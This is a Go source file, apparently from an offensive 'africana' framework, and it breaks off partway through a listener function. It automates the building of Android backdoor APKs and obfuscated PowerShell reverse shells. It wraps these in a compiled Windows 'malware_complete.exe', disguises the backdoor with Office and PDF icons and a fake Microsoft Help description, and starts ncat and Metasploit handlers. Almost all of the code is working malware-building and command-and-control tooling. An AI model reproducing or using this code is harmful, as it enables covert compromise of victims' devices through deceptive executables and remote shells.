package butchers

import(
    "os"
    "fmt"
    "log"
    "utils"
    "bufio"
    "bytes"
    "menus"
    "banners"
    "strings"
    "bcolors"
    "io/ioutil"
    "subprocess"
    "unicode/utf16"
    "encoding/base64"
)

var(
    userInput   string
    userTarget  string
    userLhost   string
    userLport   string
    userHport   string
    userMalware string
    userScript  string
    userOutput  string
    scanner = bufio.NewScanner(os.Stdin)
)

func Havoc() {
    subprocess.Popen(`havoc client & havoc server -d -v`)
    fmt.Println()
}

func Shellz() {
    subprocess.Popen(`cd /root/.africana/africana-base/exploits/shells/; bash shells.sh`)
}

func SeaShell() {
    subprocess.Popen(`cd /root/.africana/africana-base/exploits/mackrat/; python3 sea_shell.py`)
}

func MeterPeter() {
    subprocess.Popen(`cd /root/.africana/africana-base/exploits/meterpeter/; pwsh meterpeter.ps1`)
}

func AndroRat() {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println(bcolors.RED + "Error!" + bcolors.ENDC + ": " + bcolors.BLUE + "Getting default " + bcolors.RED + "LhostIp ", err)
    }
    filePath := "/usr/bin/zipalign.bak_africana"
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        subprocess.Popen(`mv /usr/bin/zipalign /usr/bin/zipalign.bak_africana`)
        subprocess.Popen(`apt-get install /root/.africana/africana-base/exploits/androrat/zipalign_8.1.0.deb --allow-downgrades -y`)
    }

    for {
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "src/butchers/androids/andro_rat.fn" + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
        scanner.Scan()
        userInput := scanner.Text()
        convertInput := strings.ToLower(userInput)
        buildParts := strings.Fields(convertInput)

        if len(buildParts) == 0 {
            continue
        }

        // Combine parts of the input back to a full command for matching
        fullInput := strings.Join(buildParts, " ")

        switch fullInput {
        case "banner":
            banners.RandomBanners()
        case "sleep":
            utils.Sleep()
        case "v", "version":
            banners.Version()
        case "m", "menu":
            menus.MenuThreeOne()
        case "logs", "history":
            subprocess.LogHistory()
        case "o", "junks", "outputs":
            utils.ListJunks()
        case "? info", "help info":
            menus.HelpInfo()
        case "00", "?", "h", "help":
            menus.HelpInfoMenuZero()
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "clear logs", "clear history":
            subprocess.ClearHistory()
        case "info set", "help set":
            menus.HelpInfoSet()
        case "clear junks", "clear outputs":
            utils.ClearJunks()
        case "? use", "info use", "help use", "use":
            menus.HelpInfoUse()
        case "? run", "info run", "help run":
            menus.HelpInfoRun()
        case "f", "use f", "use features", "features":
            menus.HelpInfoFeatures()
        case "? tips", "info tips", "help tips", "tips":
            menus.HelpInfoTips()
        case "? show", "info show", "help show", "show":
            menus.HelpInfoShow()
        case "info list", "help list", "use list", "list":
            menus.HelpInfoList()
        case "? start", "info start", "help start":
            menus.HelpInfoStart()
        case "? options", "info options", "help options":
            menus.HelpInfOptions()
        case "list all", "list modules", "show modules", "show all", "modules":
            menus.HelpInfoExplScan()
        case "info", "options", "show options":
            menus.AndroRatOptions()
            AndroRat()
            return // Stop further recursion and return to the previous function call
        case "set":
            if len(buildParts) < 3 {
                menus.HelpInfoSet()
                continue
            }
            switch buildParts[1] {
            case "lhost":
                userLhostIp = buildParts[2]
                fmt.Printf("LHOST => %s\n", userLhostIp)
            case "lport":
                userLport = buildParts[2]
                fmt.Printf("LPORT => %s\n", userLport)
            case "build":
                userMalware = buildParts[2]
                fmt.Printf("BUILD => %s.apk\n", userMalware)
            case "output":
                userOutput = buildParts[2]
                fmt.Printf("OUTPUT => %s\n", userOutput)
            default:
                menus.HelpInfoSet()
            }
        case "run", "start", "launch", "exploit", "execute":
            if userLhostIp != "" && userLport != "" && userMalware != "" && userOutput != "" {
                fmt.Printf("\nLHOST => %s\nLPORT => %s\nBUILD => %s.apk\nOUTPUT => %s\n\n", userLhost, userLport, userMalware, userOutput)
                subprocess.Popen(`cd /root/.africana/africana-base/exploits/androrat/; python3 androrat.py --build -i %s -p %s -o %s.apk`, userLhost, userLport, userOutput+userMalware)
                subprocess.Popen(`cd /root/.africana/africana-base/exploits/androrat/; python3 androrat.py --shell -i %s -p %s`, userLhost, userLport)
                fmt.Println()
            } else {
                if userLhost == "" {
                    userLhost = userLhostIp
                }
                if userLport == "" {
                    userLport = "9999"
                }
                if userMalware == "" {
                    userMalware = "africana_malware"
                }
                if userOutput == "" {
                    userOutput = "/root/.africana/output/"
                }
                fmt.Printf("\nLHOST => %s\nLPORT => %s\nBUILD => %s.apk\nOUTPUT => %s\n\n", userLhost, userLport, userMalware, userOutput)
                subprocess.Popen(`cd /root/.africana/africana-base/exploits/androrat/; python3 androrat.py --build -i %s -p %s -o %s.apk`, userLhost, userLport, userOutput+userMalware)
                subprocess.Popen(`cd /root/.africana/africana-base/exploits/androrat/; python3 androrat.py --shell -i %s -p %s`, userLhost, userLport)
                fmt.Println()
            }
        default:
            utils.SystemShell(userInput)
        }
    }
}


func TearDroid() {
    fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "src/butchers/androids/tear_droid.fnset_OUTPUT_NAME_default/%s = %safricana_backdoor.apk%s", bcolors.ENDC, bcolors.ORANGE, bcolors.ENDC + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
    scanner.Scan()
    userMalware := scanner.Text()
    if userMalware == "" {
        userMalware = "africana_backdoor"
    }
    fmt.Printf(`OUTPUT_NAME => %s.apk`, userMalware)
    fmt.Println()
    subprocess.Popen(`cd /root/.africana/africana-base/exploits/teardroid/; python3 Teardroid.py -b %s`, userMalware)
}

func Chameleon() {
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Full path to your " + bcolors.PURPLE + ".Ps1" + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    fmt.Scan(&userScript)
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/output/leviathan.txt" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    scanner.Scan()
    userOutput := scanner.Text()
    if userOutput == "" {
        userOutput = "/root/.africana/output/leviathan.txt"
    }
    subprocess.Popen(`cd /root/.africana/africana-base/exploits/chameleon/; python3 chameleon.py -a %s -o %s`, userScript, userOutput)
}

func Gh0x0st() {
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Full path to your " + bcolors.PURPLE + ".Ps1" + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    fmt.Scan(&userScript)
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/output/leviathan.txt" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    scanner.Scan()
    userOutput := scanner.Text()
    if userOutput == "" {
        userOutput = "/root/.africana/output/levuathan.txt"
    }
    subprocess.Popen(`cd /root/.africana/africana-base/exploits/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, userScript, userOutput)
}

func PowerJoker() {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println(bcolors.RED + "Error!!" + bcolors.ENDC + ": " + bcolors.BLUE + "Getting default " + bcolors.RED + "LhostIp ", err)
    }
    fmt.Println()
    subprocess.Popen(`ip address`)
    fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "c2/androids/androrat/set_LHOST_default/%s = %s%s", bcolors.ENDC, bcolors.ORANGE, userLhostIp + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
    scanner.Scan()
    userLhost := scanner.Text()
    if userLhost == "" {
        userLhost = userLhostIp
    }
    fmt.Printf(`LHOST => %s`, userLhostIp)
    fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "c2/androids/androrat/set_LPORT_default/%s = %s9999%s", bcolors.ENDC, bcolors.ORANGE, bcolors.ENDC + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
    scanner.Scan()
    userLport := scanner.Text()
    if userLport == "" {
        userLport = "9999"
    }
    fmt.Printf(`LPORT => %s`, userLport)
    subprocess.Popen(`cd /root/.africana/africana-base/exploits/joker/; python3 joker.py -l %s -p %s`, userLhost, userLport)
}

func BlackJack() {
    fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "c2/androids/androrat/set_LISTENER_Types_1.tcp_2.https_default/%s = %stcp%s", bcolors.ENDC, bcolors.ORANGE, bcolors.ENDC + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
    scanner.Scan()
    userInput := scanner.Text()
    if userInput == "" {
        userInput = "1"
    }
    fmt.Printf(`LISTENER => %s`, userInput)
    fmt.Println()
    switch userInput {
    case "0":
        return
    case "1":
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "c2/androids/androrat/set_LPORT_default/%s = %s9999%s", bcolors.ENDC, bcolors.ORANGE, bcolors.ENDC + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
        scanner.Scan()
        userLport := scanner.Text()
        if userLport == "" {
            userLport = "9999"
        }
        fmt.Printf(`LPORT => %s`, userLport)
        fmt.Println()
        subprocess.Popen(`cd /root/.africana/africana-base/exploits/blackjack/; python3 blackjack.py -q -i -n %s`, userLport)
    case "2":
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "c2/androids/androrat/set_LPORT_default/%s = %s9999%s", bcolors.ENDC, bcolors.ORANGE, bcolors.ENDC + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
        scanner.Scan()
        userLport := scanner.Text()
        if userLport == "" {
            userLport = "9999"
        }
        fmt.Printf(`LPORT => %s`, userLport)
        fmt.Println()
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "c2/androids/androrat/set_HPORT_default/%s = %s3333%s", bcolors.ENDC, bcolors.ORANGE, bcolors.ENDC + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
        scanner.Scan()
        userHport := scanner.Text()
        if userHport == "" {
            userHport = "3333"
        }
        fmt.Printf(`HPORT => %s`, userHport)
        fmt.Println()
        subprocess.Popen(`cd /root/.africana/africana-base/exploits/blackjack/; python3 blackjack.py -q -i -c /root/.africana/certs/africana-cert.pem -k /root/.africana/certs/africana-key.pem -x %s -n %s`, userLport, userHport)
    default:
        utils.SystemShell(userInput)
    }
}

func ShikataGanai() {
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "use " + bcolors.GREEN + "listener " + bcolors.BLUE + "1. " + bcolors.YELLOW + "TCP " + bcolors.BLUE + "2. " + bcolors.YELLOW + "HTTPS " + bcolors.ENDC + bcolors.ITALIC + "or " + bcolors.BLUE + "0. " + bcolors.YELLOW + bcolors.ITALIC + "Go back" + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    scanner.Scan()
    userInput := scanner.Text()
    if userInput == "" {
        userInput = "1"
    }
    switch userInput {
    case "0":
        return
    case "1":
        userLhostIp, err := utils.GetDefaultIP()
        if err != nil {
            fmt.Println(bcolors.RED + "Error!" + bcolors.ENDC + ": " + bcolors.BLUE + "Getting default " + bcolors.RED + "LhostIp ", err)
        }
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "c2/androids/androrat/set_LHOST_default/%s = %s%s", bcolors.ENDC, bcolors.ORANGE, userLhostIp + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
        scanner.Scan()
        userLhost := scanner.Text()
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Printf("LHOST => %s\n", userLhostIp)
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "c2/androids/androrat/set_LPORT_default/%s = %s9999%s", bcolors.ENDC, bcolors.ORANGE, bcolors.ENDC + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
        scanner.Scan()
        userLport := scanner.Text()
        if userLport == "" {
            userLport = "9999"
        }
        fmt.Printf("LPORT => %s\n", userLport)
        subprocess.Popen(`cp -r /root/.africana/africana-base/exploits/payload_templates/ncat_exploits/powershell_reverse_tcp.ps1 /root/.africana/output/powershell_reverse_tcp.txt`)
        filesToReplacements := map[string]map[string]string{
            "/root/.africana/output/powershell_reverse_tcp.txt": {
            `*LHOST*`: userLhost,
            `*LPORT*`: userLport,
            },
        }
        fmt.Println()
        utils.Editors(filesToReplacements)
        userScript := `/root/.africana/output/powershell_reverse_tcp.txt`
        userOutput := `/root/.africana/output/powershell_reverse_tcp.ps1`
        subprocess.Popen(`cd /root/.africana/africana-base/exploits/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, userScript, userOutput)

        filePath := "/root/.africana/output/powershell_reverse_tcp.ps1"
        content, err := ioutil.ReadFile(filePath)
        if err != nil {
            fmt.Printf("Error reading file: %v\n", err)
            return
        }

        utf16Content := utf16.Encode([]rune(string(content)))
        buf := new(bytes.Buffer)
        for _, v := range utf16Content {
            buf.Write([]byte{byte(v), byte(v >> 8)})
        }

        encoded := base64.StdEncoding.EncodeToString(buf.Bytes())

        subprocess.Popen(`cp -r /root/.africana/africana-base/exploits/payload_templates/go_exploits/malware_complete.go /root/.africana/output/malware_complete.go`)
        Replacement := map[string]map[string]string{
            "/root/.africana/output/malware_complete.go": {
            `africana`: encoded,
            },
        }
        utils.Editors(Replacement)
        fmt.Printf(bcolors.BLUE + "\nBase64 Encoded PS1 Script: " + bcolors.ENDC + "pOwErSheLl -w 1 -Enc " + bcolors.DARKGREEN + `"%s"` + bcolors.ENDC , encoded)
        fmt.Printf(bcolors.BLUE + "\n\nIntergrating the Malware: " + bcolors.ENDC + "with base64!\n" + bcolors.DARKGREEN)
        subprocess.Popen(`GOOS=windows GOARCH=amd64 go build -v -x -o /root/.africana/output/malware_complete.exe /root/.africana/output/malware_complete.go`)

    case "2":
        userLhostIp, err := utils.GetDefaultIP()
        if err != nil {
            fmt.Println(bcolors.RED + "Error!!" + bcolors.ENDC + ": " + bcolors.BLUE + "Getting default " + bcolors.RED + "LhostIp ", err)
        }
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "c2/androids/androrat/set_LHOST_default/%s = %s%s", bcolors.ENDC, bcolors.ORANGE, userLhostIp + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
        scanner.Scan()
        userLhost := scanner.Text()
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Printf("LHOST => %s\n", userLhostIp)
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "c2/androids/androrat/set_LPORT_default/%s = %s9999%s", bcolors.ENDC, bcolors.ORANGE, bcolors.ENDC + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
        scanner.Scan()
        userLport := scanner.Text()
        if userLport == "" {
            userLport = "9999"
        }
        fmt.Printf("LPORT => %s\n", userLport)
        subprocess.Popen(`cp -r /root/.africana/africana-base/exploits/payload_templates/ncat_exploits/powershell_reverse_http.ps1 /root/.africana/output/powershell_reverse_http.txt`)
        filesToReplacements := map[string]map[string]string{
            "/root/.africana/output/powershell_reverse_http.txt": {
            `*LHOST*`: userLhost,
            `*LPORT*`: userLport,
            },
        }
        fmt.Println()
        utils.Editors(filesToReplacements)
        userScript := `/root/.africana/output/powershell_reverse_http.txt`
        userOutput := `/root/.africana/output/powershell_reverse_http.ps1`
        subprocess.Popen(`cd /root/.africana/africana-base/exploits/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, userScript, userOutput)

        filePath := "/root/.africana/output/powershell_reverse_http.ps1"
        content, err := ioutil.ReadFile(filePath)
        if err != nil {
            fmt.Printf("Error reading file: %v\n", err)
            return
        }

        utf16Content := utf16.Encode([]rune(string(content)))
        buf := new(bytes.Buffer)
        for _, v := range utf16Content {
            buf.Write([]byte{byte(v), byte(v >> 8)})
        }

        encoded := base64.StdEncoding.EncodeToString(buf.Bytes())

        subprocess.Popen(`cp -r /root/.africana/africana-base/exploits/payload_templates/go_exploits/malware_complete.go /root/.africana/output/malware_complete.go`)
        filesToReplace := map[string]map[string]string{
            "/root/.africana/output/malware_complete.go": {
            `africana`: encoded,
            },
        }
        utils.Editors(filesToReplace)
        fmt.Printf(bcolors.BLUE + "\nBase64 Encoded PS1 Script: " + bcolors.ENDC + "pOwErSheLl -w 1 -Enc " + bcolors.DARKGREEN + `"%s"` + bcolors.ENDC , encoded)
        fmt.Printf(bcolors.BLUE + "\n\nCompiling the Malware: " + bcolors.ENDC + "with base64\n" + bcolors.DARKGREEN)
        subprocess.Popen(`GOOS=windows GOARCH=amd64 go build -v -x -o /root/.africana/output/malware_complete.exe /root/.africana/output/malware_complete.go`)

    default:
        utils.SystemShell(userInput)
    }
}

func IconChanger() {
    fmt.Println()
    fmt.Print(bcolors.BLUE + "[" + bcolors.ENDC + "+" + bcolors.BLUE + "] " + bcolors.ENDC + "Do you want to change Malware icon? " + bcolors.RED + "[y/n]: " + bcolors.ENDC)
    scanner.Scan()
    userInput := scanner.Text()
    if userInput == "" {
        userInput = "y"
    }
    switch userInput {
    case "n":
        return
    case "y":
        menus.MenuFourSevenTwo()
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Icon " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "word.ico" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        scanner.Scan()
        userInput := scanner.Text()
        if userInput == "" {
            userInput = "11"
        }
        switch userInput {
        case "0":
            return
        case "1":
            subprocess.Popen(`wine /root/.africana/africana-base/exploits/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/payload_templates/icons/lync.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
        case "2":
            subprocess.Popen(`wine /root/.africana/africana-base/exploits/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/payload_templates/icons/excel.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
        case "3":
            subprocess.Popen(`wine /root/.africana/africana-base/exploits/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/payload_templates/icons/access.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
        case "4":
            subprocess.Popen(`wine /root/.africana/africana-base/exploits/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/payload_templates/icons/autorun.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
        case "5":
            subprocess.Popen(`wine /root/.africana/africana-base/exploits/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/payload_templates/icons/pdf.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
        case "6":
            subprocess.Popen(`wine /root/.africana/africana-base/exploits/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/payload_templates/icons/project.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
        case "7":
            subprocess.Popen(`wine /root/.africana/africana-base/exploits/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/payload_templates/icons/publisher.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
        case "8":
            subprocess.Popen(`wine /root/.africana/africana-base/exploits/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/payload_templates/icons/powerpoint.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
        case "9":
            subprocess.Popen(`wine /root/.africana/africana-base/exploits/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/payload_templates/icons/rat.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
        case "10":
            subprocess.Popen(`wine /root/.africana/africana-base/exploits/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/payload_templates/icons/vlc.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
        case "11":
            subprocess.Popen(`wine /root/.africana/africana-base/exploits/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/payload_templates/icons/word.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
        case "12":
            subprocess.Popen(`wine /root/.africana/africana-base/exploits/payload_templates/rcedits/rcedit-x64.exe /root/.africana/output/africana_backdoor.exe --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon /root/.africana/africana-base/exploits/payload_templates/icons/visio.ico --set-version-string OriginalFilename "MicrosoftHelpPane.exe" --set-version-string FileDescription "Microsoft Help and Support"`)
        default:
            utils.SystemShell(userInput)
        }
    }
}

func ListenerTcp() {
    menus.MenuFourSevenOne()
    fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED +  "listener_tcp" + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
    scanner.Scan()
    userInput := scanner.Text()
    if userInput == "" {
        userInput = "1"
    }
    switch strings.ToLower(userInput) {
    case "0", "e", "exit", "back":
        return
    case "1":
        userLhostIp, err := utils.GetDefaultIP()
        if err != nil {
            fmt.Println(bcolors.RED + "Error!!" + bcolors.ENDC + ": " + bcolors.BLUE + "Getting default " + bcolors.RED + "LhostIp ", err)
        }
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "c2/androids/androrat/set_LHOST_default/%s = %s%s", bcolors.ENDC, bcolors.ORANGE, userLhostIp + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
        scanner.Scan()
        userLhost := scanner.Text()
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Printf(`LHOST => %s`, userLhostIp)
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "c2/androids/androrat/set_LPORT_default/%s = %s9999%s", bcolors.ENDC, bcolors.ORANGE, bcolors.ENDC + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
        scanner.Scan()
        userLport := scanner.Text()
        if userLport == "" {
            userLport = "9999"
        }
        fmt.Printf(`LPORT => %s`, userLport)
        subprocess.Popen(`rlwrap ncat -lnvp %s`, userLport)

    case "2":
         BlackJack()

    case "3":
        userLhostIp, err := utils.GetDefaultIP()
        if err != nil {
            fmt.Println(bcolors.RED + "Error!!" + bcolors.ENDC + ": " + bcolors.BLUE + "Getting default " + bcolors.RED + "LhostIp ", err)
        }
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "c2/androids/androrat/set_LHOST_default/%s = %s%s", bcolors.ENDC, bcolors.ORANGE, userLhostIp + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
        scanner.Scan()
        userLhost := scanner.Text()
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Printf(`LHOST => %s`, userLhostIp)
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "c2/androids/androrat/set_LPORT_default/%s = %s9999%s", bcolors.ENDC, bcolors.ORANGE, bcolors.ENDC + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
        scanner.Scan()
        userLport := scanner.Text()
        if userLport == "" {
            userLport = "9999"
        }
        fmt.Printf(`LPORT => %s`, userLport)
        subprocess.Popen(`msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j"`, userLhostIp, userLport)
    default:
        utils.SystemShell(userInput)
    }
}

func ListenerHttp() {
    menus.MenuFourSevenOne()
    fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED +  "listener_https" + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
    scanner.Scan()
    userInput := scanner.Text()
    if userInput == "" {
        userInput = "1"
    }
    switch strings.ToLower(userInput) {
    case "0", "e", "exit", "back":
        return
    case "1":
        userLhostIp, err := utils.GetDefaultIP()
        if err != nil {
            fmt.Println(bcolors.RED + "Error!!" + bcolors.ENDC + ": " + bcolors.BLUE + "Getting default " + bcolors.RED + "LhostIp ", err)
        }
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "c2/androids/androrat/set_LHOST_default/%s = %s%s", bcolors.ENDC, bcolors.ORANGE, userLhostIp + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
        scanner.Scan()
        userLhost := scanner.Text()
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Printf(`LHOST => %s`, userLhostIp)
        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " exploit(" + bcolors.RED + "c2/androids/androrat/set_LPORT_default/%s = %s9999%s", bcolors.ENDC, bcolors.ORANGE, bcolors.ENDC + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
        scanner.Scan()
        userLport := scanner.Text()
        if userLport == "" {
